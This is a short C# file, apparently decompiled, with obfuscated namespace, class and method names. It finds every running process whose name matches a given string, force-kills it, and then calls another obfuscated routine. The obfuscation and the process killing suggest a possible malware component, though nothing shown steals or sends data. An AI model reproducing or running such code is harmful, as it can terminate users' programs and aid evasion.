using System;
using System.Diagnostics;

namespace drXPuaQNZPOSPCS;

public sealed class wpIzfzvfbdyG
{
	public static bool qLsMtHBLHahqxVb(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void ToxqlBnTua(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (qLsMtHBLHahqxVb(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					OBRXLDkWsVk.obiNERLnbtQgNNVVN();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
